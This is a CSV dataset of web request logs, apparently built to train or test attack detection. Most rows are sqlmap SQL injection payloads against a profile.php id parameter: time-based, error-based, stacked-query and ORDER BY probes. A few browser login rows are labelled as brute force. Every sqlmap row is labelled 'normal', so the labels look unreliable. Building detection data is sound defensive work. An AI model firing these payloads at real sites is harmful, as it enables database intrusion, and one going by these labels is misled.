url,method,status,ua,label
/profile.php?id=1%20AND%204358%20IN%20%28SELECT%20%28CHAR%28113%29%2BCHAR%28120%29%2BCHAR%28122%29%2BCHAR%28112%29%2BCHAR%28113%29%2B%28SELECT%20%28CASE%20WHEN%20%284358%3D4358%29%20THEN%20CHAR%2849%29%20ELSE%20CHAR%2848%29%20END%29%29%2BCHAR%28113%29%2BCHAR%28122%29%2BCHAR%28122%29%2BCHAR%28112%29%2BCHAR%28113%29%29%29--%20dueg,GET,302,sqlmap/1.9.8#stable (https://sqlmap.org),normal
/login.php,GET,200,sqlmap/1.9.8#stable (https://sqlmap.org),normal
/profile.php?id=1%27%29%20AND%204358%20IN%20%28SELECT%20%28CHAR%28113%29%2BCHAR%28120%29%2BCHAR%28122%29%2BCHAR%28112%29%2BCHAR%28113%29%2B%28SELECT%20%28CASE%20WHEN%20%284358%3D4358%29%20THEN%20CHAR%2849%29%20ELSE%20CHAR%2848%29%20END%29%29%2BCHAR%28113%29%2BCHAR%28122%29%2BCHAR%28122%29%2BCHAR%28112%29%2BCHAR%28113%29%29%29%20AND%20%28%27QkCZ%27%3D%27QkCZ,GET,302,sqlmap/1.9.8#stable (https://sqlmap.org),normal
/login.php,GET,200,sqlmap/1.9.8#stable (https://sqlmap.org),normal
/profile.php?id=1%27%20AND%204358%20IN%20%28SELECT%20%28CHAR%28113%29%2BCHAR%28120%29%2BCHAR%28122%29%2BCHAR%28112%29%2BCHAR%28113%29%2B%28SELECT%20%28CASE%20WHEN%20%284358%3D4358%29%20THEN%20CHAR%2849%29%20ELSE%20CHAR%2848%29%20END%29%29%2BCHAR%28113%29%2BCHAR%28122%29%2BCHAR%28122%29%2BCHAR%28112%29%2BCHAR%28113%29%29%29%20AND%20%27uVHE%27%3D%27uVHE,GET,302,sqlmap/1.9.8#stable (https://sqlmap.org),normal
/login.php,GET,200,sqlmap/1.9.8#stable (https://sqlmap.org),normal
/profile.php?id=1%29%20AND%207197%3D%28SELECT%20UPPER%28XMLType%28CHR%2860%29%7C%7CCHR%2858%29%7C%7CCHR%28113%29%7C%7CCHR%28120%29%7C%7CCHR%28122%29%7C%7CCHR%28112%29%7C%7CCHR%28113%29%7C%7C%28SELECT%20%28CASE%20WHEN%20%287197%3D7197%29%20THEN%201%20ELSE%200%20END%29%20FROM%20DUAL%29%7C%7CCHR%28113%29%7C%7CCHR%28122%29%7C%7CCHR%28122%29%7C%7CCHR%28112%29%7C%7CCHR%28113%29%7C%7CCHR%2862%29%29%29%20FROM%20DUAL%29%20AND%20%286341%3D6341,GET,302,sqlmap/1.9.8#stable (https://sqlmap.org),normal
/login.php,GET,200,sqlmap/1.9.8#stable (https://sqlmap.org),normal
/profile.php?id=1%20AND%207197%3D%28SELECT%20UPPER%28XMLType%28CHR%2860%29%7C%7CCHR%2858%29%7C%7CCHR%28113%29%7C%7CCHR%28120%29%7C%7CCHR%28122%29%7C%7CCHR%28112%29%7C%7CCHR%28113%29%7C%7C%28SELECT%20%28CASE%20WHEN%20%287197%3D7197%29%20THEN%201%20ELSE%200%20END%29%20FROM%20DUAL%29%7C%7CCHR%28113%29%7C%7CCHR%28122%29%7C%7CCHR%28122%29%7C%7CCHR%28112%29%7C%7CCHR%28113%29%7C%7CCHR%2862%29%29%29%20FROM%20DUAL%29,GET,302,sqlmap/1.9.8#stable (https://sqlmap.org),normal
/login.php,GET,200,sqlmap/1.9.8#stable (https://sqlmap.org),normal
/profile.php?id=1%20AND%207197%3D%28SELECT%20UPPER%28XMLType%28CHR%2860%29%7C%7CCHR%2858%29%7C%7CCHR%28113%29%7C%7CCHR%28120%29%7C%7CCHR%28122%29%7C%7CCHR%28112%29%7C%7CCHR%28113%29%7C%7C%28SELECT%20%28CASE%20WHEN%20%287197%3D7197%29%20THEN%201%20ELSE%200%20END%29%20FROM%20DUAL%29%7C%7CCHR%28113%29%7C%7CCHR%28122%29%7C%7CCHR%28122%29%7C%7CCHR%28112%29%7C%7CCHR%28113%29%7C%7CCHR%2862%29%29%29%20FROM%20DUAL%29--%20Nsab,GET,302,sqlmap/1.9.8#stable (https://sqlmap.org),normal
/login.php,GET,200,sqlmap/1.9.8#stable (https://sqlmap.org),normal
/profile.php?id=1%27%29%20AND%207197%3D%28SELECT%20UPPER%28XMLType%28CHR%2860%29%7C%7CCHR%2858%29%7C%7CCHR%28113%29%7C%7CCHR%28120%29%7C%7CCHR%28122%29%7C%7CCHR%28112%29%7C%7CCHR%28113%29%7C%7C%28SELECT%20%28CASE%20WHEN%20%287197%3D7197%29%20THEN%201%20ELSE%200%20END%29%20FROM%20DUAL%29%7C%7CCHR%28113%29%7C%7CCHR%28122%29%7C%7CCHR%28122%29%7C%7CCHR%28112%29%7C%7CCHR%28113%29%7C%7CCHR%2862%29%29%29%20FROM%20DUAL%29%20AND%20%28%27Ezuc%27%3D%27Ezuc,GET,302,sqlmap/1.9.8#stable (https://sqlmap.org),normal
/login.php,GET,200,sqlmap/1.9.8#stable (https://sqlmap.org),normal
/profile.php?id=1%27%20AND%207197%3D%28SELECT%20UPPER%28XMLType%28CHR%2860%29%7C%7CCHR%2858%29%7C%7CCHR%28113%29%7C%7CCHR%28120%29%7C%7CCHR%28122%29%7C%7CCHR%28112%29%7C%7CCHR%28113%29%7C%7C%28SELECT%20%28CASE%20WHEN%20%287197%3D7197%29%20THEN%201%20ELSE%200%20END%29%20FROM%20DUAL%29%7C%7CCHR%28113%29%7C%7CCHR%28122%29%7C%7CCHR%28122%29%7C%7CCHR%28112%29%7C%7CCHR%28113%29%7C%7CCHR%2862%29%29%29%20FROM%20DUAL%29%20AND%20%27poDb%27%3D%27poDb,GET,302,sqlmap/1.9.8#stable (https://sqlmap.org),normal
/login.php,GET,200,sqlmap/1.9.8#stable (https://sqlmap.org),normal
/profile.php?id=%28SELECT%20CONCAT%28CONCAT%28%27qxzpq%27%2C%28CASE%20WHEN%20%284467%3D4467%29%20THEN%20%271%27%20ELSE%20%270%27%20END%29%29%2C%27qzzpq%27%29%29,GET,302,sqlmap/1.9.8#stable (https://sqlmap.org),normal
/login.php,GET,200,sqlmap/1.9.8#stable (https://sqlmap.org),normal
/profile.php?id=1,GET,302,sqlmap/1.9.8#stable (https://sqlmap.org),normal
/login.php,GET,200,sqlmap/1.9.8#stable (https://sqlmap.org),normal
/profile.php?id=1%29%3BSELECT%20PG_SLEEP%285%29--,GET,302,sqlmap/1.9.8#stable (https://sqlmap.org),normal
/login.php,GET,200,sqlmap/1.9.8#stable (https://sqlmap.org),normal
/profile.php?id=1%3BSELECT%20PG_SLEEP%285%29--,GET,302,sqlmap/1.9.8#stable (https://sqlmap.org),normal
/login.php,GET,200,sqlmap/1.9.8#stable (https://sqlmap.org),normal
/profile.php?id=1%27%29%3BSELECT%20PG_SLEEP%285%29--,GET,302,sqlmap/1.9.8#stable (https://sqlmap.org),normal
/login.php,GET,200,sqlmap/1.9.8#stable (https://sqlmap.org),normal
/profile.php?id=1%27%3BSELECT%20PG_SLEEP%285%29--,GET,302,sqlmap/1.9.8#stable (https://sqlmap.org),normal
/login.php,GET,200,sqlmap/1.9.8#stable (https://sqlmap.org),normal
/profile.php?id=1%29%3BWAITFOR%20DELAY%20%270%3A0%3A5%27--,GET,302,sqlmap/1.9.8#stable (https://sqlmap.org),normal
/login.php,GET,200,sqlmap/1.9.8#stable (https://sqlmap.org),normal
/profile.php?id=1%3BWAITFOR%20DELAY%20%270%3A0%3A5%27--,GET,302,sqlmap/1.9.8#stable (https://sqlmap.org),normal
/login.php,GET,200,sqlmap/1.9.8#stable (https://sqlmap.org),normal
/profile.php?id=1%27%29%3BWAITFOR%20DELAY%20%270%3A0%3A5%27--,GET,302,sqlmap/1.9.8#stable (https://sqlmap.org),normal
/login.php,GET,200,sqlmap/1.9.8#stable (https://sqlmap.org),normal
/profile.php?id=1%27%3BWAITFOR%20DELAY%20%270%3A0%3A5%27--,GET,302,sqlmap/1.9.8#stable (https://sqlmap.org),normal
/login.php,GET,200,sqlmap/1.9.8#stable (https://sqlmap.org),normal
/profile.php?id=1%29%3BSELECT%20DBMS_PIPE.RECEIVE_MESSAGE%28CHR%28102%29%7C%7CCHR%2876%29%7C%7CCHR%2877%29%7C%7CCHR%28121%29%2C5%29%20FROM%20DUAL--,GET,302,sqlmap/1.9.8#stable (https://sqlmap.org),normal
/login.php,GET,200,sqlmap/1.9.8#stable (https://sqlmap.org),normal
/profile.php?id=1%3BSELECT%20DBMS_PIPE.RECEIVE_MESSAGE%28CHR%28102%29%7C%7CCHR%2876%29%7C%7CCHR%2877%29%7C%7CCHR%28121%29%2C5%29%20FROM%20DUAL--,GET,302,sqlmap/1.9.8#stable (https://sqlmap.org),normal
/login.php,GET,200,sqlmap/1.9.8#stable (https://sqlmap.org),normal
/profile.php?id=1%27%29%3BSELECT%20DBMS_PIPE.RECEIVE_MESSAGE%28CHR%28102%29%7C%7CCHR%2876%29%7C%7CCHR%2877%29%7C%7CCHR%28121%29%2C5%29%20FROM%20DUAL--,GET,302,sqlmap/1.9.8#stable (https://sqlmap.org),normal
/login.php,GET,200,sqlmap/1.9.8#stable (https://sqlmap.org),normal
/profile.php?id=1%27%3BSELECT%20DBMS_PIPE.RECEIVE_MESSAGE%28CHR%28102%29%7C%7CCHR%2876%29%7C%7CCHR%2877%29%7C%7CCHR%28121%29%2C5%29%20FROM%20DUAL--,GET,302,sqlmap/1.9.8#stable (https://sqlmap.org),normal
/login.php,GET,200,sqlmap/1.9.8#stable (https://sqlmap.org),normal
/profile.php?id=1%29%20AND%20%28SELECT%202833%20FROM%20%28SELECT%28SLEEP%285%29%29%29UplT%29%20AND%20%286171%3D6171,GET,302,sqlmap/1.9.8#stable (https://sqlmap.org),normal
/login.php,GET,200,sqlmap/1.9.8#stable (https://sqlmap.org),normal
/profile.php?id=1%20AND%20%28SELECT%202833%20FROM%20%28SELECT%28SLEEP%285%29%29%29UplT%29,GET,302,sqlmap/1.9.8#stable (https://sqlmap.org),normal
/login.php,GET,200,sqlmap/1.9.8#stable (https://sqlmap.org),normal
/profile.php?id=1%20AND%20%28SELECT%202833%20FROM%20%28SELECT%28SLEEP%285%29%29%29UplT%29--%20gCiJ,GET,302,sqlmap/1.9.8#stable (https://sqlmap.org),normal
/login.php,GET,200,sqlmap/1.9.8#stable (https://sqlmap.org),normal
/profile.php?id=1%27%29%20AND%20%28SELECT%202833%20FROM%20%28SELECT%28SLEEP%285%29%29%29UplT%29%20AND%20%28%27jLmb%27%3D%27jLmb,GET,302,sqlmap/1.9.8#stable (https://sqlmap.org),normal
/login.php,GET,200,sqlmap/1.9.8#stable (https://sqlmap.org),normal
/profile.php?id=1%27%20AND%20%28SELECT%202833%20FROM%20%28SELECT%28SLEEP%285%29%29%29UplT%29%20AND%20%27DMII%27%3D%27DMII,GET,302,sqlmap/1.9.8#stable (https://sqlmap.org),normal
/login.php,GET,200,sqlmap/1.9.8#stable (https://sqlmap.org),normal
/profile.php?id=1%29%20AND%208544%3D%28SELECT%208544%20FROM%20PG_SLEEP%285%29%29%20AND%20%289102%3D9102,GET,302,sqlmap/1.9.8#stable (https://sqlmap.org),normal
/login.php,GET,200,sqlmap/1.9.8#stable (https://sqlmap.org),normal
/profile.php?id=1%20AND%208544%3D%28SELECT%208544%20FROM%20PG_SLEEP%285%29%29,GET,302,sqlmap/1.9.8#stable (https://sqlmap.org),normal
/login.php,GET,200,sqlmap/1.9.8#stable (https://sqlmap.org),normal
/profile.php?id=1%20AND%208544%3D%28SELECT%208544%20FROM%20PG_SLEEP%285%29%29--%20liTb,GET,302,sqlmap/1.9.8#stable (https://sqlmap.org),normal
/login.php,GET,200,sqlmap/1.9.8#stable (https://sqlmap.org),normal
/profile.php?id=1%27%29%20AND%208544%3D%28SELECT%208544%20FROM%20PG_SLEEP%285%29%29%20AND%20%28%27uDWw%27%3D%27uDWw,GET,302,sqlmap/1.9.8#stable (https://sqlmap.org),normal
/login.php,GET,200,sqlmap/1.9.8#stable (https://sqlmap.org),normal
/profile.php?id=1%27%20AND%208544%3D%28SELECT%208544%20FROM%20PG_SLEEP%285%29%29%20AND%20%27wgkD%27%3D%27wgkD,GET,302,sqlmap/1.9.8#stable (https://sqlmap.org),normal
/login.php,GET,200,sqlmap/1.9.8#stable (https://sqlmap.org),normal
/profile.php?id=1%29%20WAITFOR%20DELAY%20%270%3A0%3A5%27%20AND%20%284360%3D4360,GET,302,sqlmap/1.9.8#stable (https://sqlmap.org),normal
/login.php,GET,200,sqlmap/1.9.8#stable (https://sqlmap.org),normal
/profile.php?id=1%20WAITFOR%20DELAY%20%270%3A0%3A5%27,GET,302,sqlmap/1.9.8#stable (https://sqlmap.org),normal
/login.php,GET,200,sqlmap/1.9.8#stable (https://sqlmap.org),normal
/profile.php?id=1%20WAITFOR%20DELAY%20%270%3A0%3A5%27--%20DzrE,GET,302,sqlmap/1.9.8#stable (https://sqlmap.org),normal
/login.php,GET,200,sqlmap/1.9.8#stable (https://sqlmap.org),normal
/profile.php?id=1%27%29%20WAITFOR%20DELAY%20%270%3A0%3A5%27%20AND%20%28%27GCBh%27%3D%27GCBh,GET,302,sqlmap/1.9.8#stable (https://sqlmap.org),normal
/login.php,GET,200,sqlmap/1.9.8#stable (https://sqlmap.org),normal
/profile.php?id=1%27%20WAITFOR%20DELAY%20%270%3A0%3A5%27%20AND%20%27wRgf%27%3D%27wRgf,GET,302,sqlmap/1.9.8#stable (https://sqlmap.org),normal
/login.php,GET,200,sqlmap/1.9.8#stable (https://sqlmap.org),normal
/profile.php?id=1%29%20AND%205238%3DDBMS_PIPE.RECEIVE_MESSAGE%28CHR%28110%29%7C%7CCHR%2885%29%7C%7CCHR%28106%29%7C%7CCHR%28119%29%2C5%29%20AND%20%287219%3D7219,GET,302,sqlmap/1.9.8#stable (https://sqlmap.org),normal
/login.php,GET,200,sqlmap/1.9.8#stable (https://sqlmap.org),normal
/profile.php?id=1%20AND%205238%3DDBMS_PIPE.RECEIVE_MESSAGE%28CHR%28110%29%7C%7CCHR%2885%29%7C%7CCHR%28106%29%7C%7CCHR%28119%29%2C5%29,GET,302,sqlmap/1.9.8#stable (https://sqlmap.org),normal
/login.php,GET,200,sqlmap/1.9.8#stable (https://sqlmap.org),normal
/profile.php?id=1%20AND%205238%3DDBMS_PIPE.RECEIVE_MESSAGE%28CHR%28110%29%7C%7CCHR%2885%29%7C%7CCHR%28106%29%7C%7CCHR%28119%29%2C5%29--%20FVlD,GET,302,sqlmap/1.9.8#stable (https://sqlmap.org),normal
/login.php,GET,200,sqlmap/1.9.8#stable (https://sqlmap.org),normal
/profile.php?id=1%27%29%20AND%205238%3DDBMS_PIPE.RECEIVE_MESSAGE%28CHR%28110%29%7C%7CCHR%2885%29%7C%7CCHR%28106%29%7C%7CCHR%28119%29%2C5%29%20AND%20%28%27ugCp%27%3D%27ugCp,GET,302,sqlmap/1.9.8#stable (https://sqlmap.org),normal
/login.php,GET,200,sqlmap/1.9.8#stable (https://sqlmap.org),normal
/profile.php?id=1%27%20AND%205238%3DDBMS_PIPE.RECEIVE_MESSAGE%28CHR%28110%29%7C%7CCHR%2885%29%7C%7CCHR%28106%29%7C%7CCHR%28119%29%2C5%29%20AND%20%27nGUo%27%3D%27nGUo,GET,302,sqlmap/1.9.8#stable (https://sqlmap.org),normal
/login.php,GET,200,sqlmap/1.9.8#stable (https://sqlmap.org),normal
/profile.php?id=1%29%20ORDER%20BY%201--%20IADb,GET,302,sqlmap/1.9.8#stable (https://sqlmap.org),normal
/login.php,GET,200,sqlmap/1.9.8#stable (https://sqlmap.org),normal
/profile.php?id=1%29%20ORDER%20BY%209007--%20vFst,GET,302,sqlmap/1.9.8#stable (https://sqlmap.org),normal
/login.php,GET,200,sqlmap/1.9.8#stable (https://sqlmap.org),normal
/profile.php?id=1%20ORDER%20BY%201--%20KFVw,GET,302,sqlmap/1.9.8#stable (https://sqlmap.org),normal
/login.php,GET,200,sqlmap/1.9.8#stable (https://sqlmap.org),normal
/profile.php?id=1%20ORDER%20BY%203535--%20iymI,GET,302,sqlmap/1.9.8#stable (https://sqlmap.org),normal
/login.php,GET,200,sqlmap/1.9.8#stable (https://sqlmap.org),normal
/profile.php?id=1%20ORDER%20BY%201--%20PtYE,GET,302,sqlmap/1.9.8#stable (https://sqlmap.org),normal
/login.php,GET,200,sqlmap/1.9.8#stable (https://sqlmap.org),normal
/profile.php?id=1%20ORDER%20BY%203167--%20goSt,GET,302,sqlmap/1.9.8#stable (https://sqlmap.org),normal
/login.php,GET,200,sqlmap/1.9.8#stable (https://sqlmap.org),normal
/profile.php?id=1%27%29%20ORDER%20BY%201--%20DdCx,GET,302,sqlmap/1.9.8#stable (https://sqlmap.org),normal
/login.php,GET,200,sqlmap/1.9.8#stable (https://sqlmap.org),normal
/profile.php?id=1%27%29%20ORDER%20BY%204994--%20gNqz,GET,302,sqlmap/1.9.8#stable (https://sqlmap.org),normal
/login.php,GET,200,sqlmap/1.9.8#stable (https://sqlmap.org),normal
/profile.php?id=1%27%20ORDER%20BY%201--%20Tkbp,GET,302,sqlmap/1.9.8#stable (https://sqlmap.org),normal
/login.php,GET,200,sqlmap/1.9.8#stable (https://sqlmap.org),normal
/profile.php?id=1%27%20ORDER%20BY%201307--%20RwMB,GET,302,sqlmap/1.9.8#stable (https://sqlmap.org),normal
/login.php,GET,200,sqlmap/1.9.8#stable (https://sqlmap.org),normal
/login.php,GET,200,Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0,normal
/login.php,POST,302,Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0,normal
/profile.php,GET,200,Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0,normal
/login.php,GET,200,Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0,bruteforce
/login.php,POST,302,Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0,bruteforce
/profile.php,GET,200,Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0,bruteforce
/logout.php,GET,302,Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0,bruteforce
/login.php,GET,200,Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0,bruteforce
/login.php,POST,200,Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0,bruteforce
/login.php,POST,200,Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0,bruteforce
/login.php,POST,200,Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0,bruteforce
/login.php,POST,200,Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0,bruteforce
